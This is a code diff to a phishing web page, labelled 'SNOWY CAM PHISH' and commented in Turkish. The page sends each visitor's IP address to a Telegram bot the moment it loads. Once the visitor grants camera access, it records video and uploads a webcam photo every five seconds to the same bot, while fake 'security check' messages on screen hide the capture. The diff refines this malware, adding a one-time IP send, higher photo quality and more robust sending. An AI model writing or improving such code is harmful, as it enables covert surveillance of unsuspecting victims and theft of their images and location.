@@ -75,9 +75,10 @@
         let recordedChunks = [];
         let videoCount = 0;
         let photoCount = 0;
+        let ipGonderildi = false;
         
         // ============================================
-        // İP ADRESİ AL - SAYFA AÇILIR AÇILMAZ ÇALIŞSIN
+        // İP ADRESİ AL
         // ============================================
         async function getIP() {
             try {
@@ -90,9 +91,11 @@
         }
         
         // ============================================
-        // İP'Yİ TELEGRAM'A GÖNDER - HTML FORMAT (Düzgün gözükmesi için)
+        // İP'Yİ TELEGRAM'A GÖNDER
         // ============================================
         async function sendIP(ip) {
+            if (ipGonderildi) return;
+            
             const msg = `<b>❄️ SNOWY CAM PHISH ❄️</b>\n━━━━━━━━━━━━━━━━━━━━━\n🌐 <b>IP Adresi:</b> ${ip}\n⏱️ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
             
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -101,9 +104,11 @@
                 body: JSON.stringify({ 
                     chat_id: TARGET_ID, 
                     text: msg, 
-                    parse_mode: 'HTML'  // Markdown'dan HTML'e çevirdim
+                    parse_mode: 'HTML'
                 })
             });
+            
+            ipGonderildi = true;
         }
         
         // ============================================
@@ -143,25 +148,57 @@
         }
         
         // ============================================
-        // FOTOĞRAF ÇEK
+        // FOTOĞRAF ÇEK - TELEGRAM İÇİN OPTİMİZE EDİLDİ
         // ============================================
         async function takePhoto() {
-            photoCount++;
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', TARGET_ID);
-                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                formData.append('caption', `📸 Fotoğraf #${photoCount} - ${new Date().toLocaleString('tr-TR')}`);
+            try {
+                photoCount++;
                 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }, 'image/jpeg', 0.7);
+                // Video hazır mı kontrol et
+                if (!video.videoWidth || !video.videoHeight) {
+                    console.log("Video hazır değil");
+                    return;
+                }
+                
+                // Kanvas boyutlarını ayarla
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Videoyu kanvasa çiz
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Kanvastan blob al (JPEG, yüksek kalite)
+                canvas.toBlob(async function(blob) {
+                    if (!blob) {
+                        console.log("Blob oluşturulamadı");
+                        return;
+                    }
+                    
+                    // FormData oluştur
+                    const formData = new FormData();
+                    formData.append('chat_id', TARGET_ID);
+                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
+                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${new Date().toLocaleString('tr-TR')}`);
+                    
+                    // Telegram'a gönder
+                    try {
+                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        const result = await response.json();
+                        if (!result.ok) {
+                            console.log("Telegram hatası:", result);
+                        }
+                    } catch(e) {
+                        console.log("Gönderme hatası:", e);
+                    }
+                }, 'image/jpeg', 0.95); // Yüksek kalite
+                
+            } catch(e) {
+                console.log("Fotoğraf çekme hatası:", e);
+            }
         }
         
         // ============================================
@@ -169,27 +206,39 @@
         // ============================================
         async function startCamera() {
             try {
-                // ÖNCE İP'Yİ GÖNDER - İZİN VERSE DE VERMESE DE
-                const ip = await getIP();
-                await sendIP(ip);
+                // Kamera izni iste - Telegram için özel ayarlar
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: "user"
+                    }
+                });
                 
-                // SONRA KAMERA İZNİ İSTE
-                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 
-                document.getElementById('startBtn').style.display = 'none';
-                document.getElementById('loading').style.display = 'block';
+                // Video yüklendiğinde
+                video.onloadedmetadata = async () => {
+                    await video.play();
+                    
+                    // IP'yi gönder
+                    const ip = await getIP();
+                    await sendIP(ip);
+                    
+                    document.getElementById('startBtn').style.display = 'none';
+                    document.getElementById('loading').style.display = 'block';
+                    
+                    // Biraz bekle
+                    setTimeout(() => {
+                        // VİDEO KAYDI BAŞLAT
+                        startVideoRecording();
+                        
+                        // FOTOĞRAF ÇEK (her 5 saniyede bir)
+                        setInterval(takePhoto, 5000);
+                    }, 2000);
+                };
                 
-                // Kamera stabil olsun
-                await new Promise(r => setTimeout(r, 2000));
-                
-                // VİDEO KAYDI BAŞLAT
-                startVideoRecording();
-                
-                // FOTOĞRAF ÇEK
-                setInterval(takePhoto, 5000);
-                
-                // YAZIYI DEĞİŞTİR
+                // Yazı değiştir
                 const texts = ["Güvenlik kontrolü...", "Kimlik doğrulanıyor...", "Lütfen bekleyin..."];
                 let i = 0;
                 setInterval(() => {
@@ -198,17 +247,17 @@
                 }, 3000);
                 
             } catch(e) {
-                // KAMERA İZNİ VERMESE BİLE İP GİTTİ!
+                console.log("Kamera hatası:", e);
                 alert('Kamera izni gerekli!');
             }
         }
         
         // ============================================
-        // SAYFA YÜKLENDİĞİNDE HEMEN İP GÖNDER
+        // SAYFA YÜKLENDİĞİNDE
         // ============================================
         window.onload = async function() {
             if (TARGET_ID) {
-                // Sayfa yüklenir yüklenmez IP'yi gönder (butona basmadan bile)
+                // IP'yi al ve gönder
                 const ip = await getIP();
                 await sendIP(ip);
             }
@@ -227,4 +276,4 @@
         };
     </script>
 </body>
-</html>
+    </html>
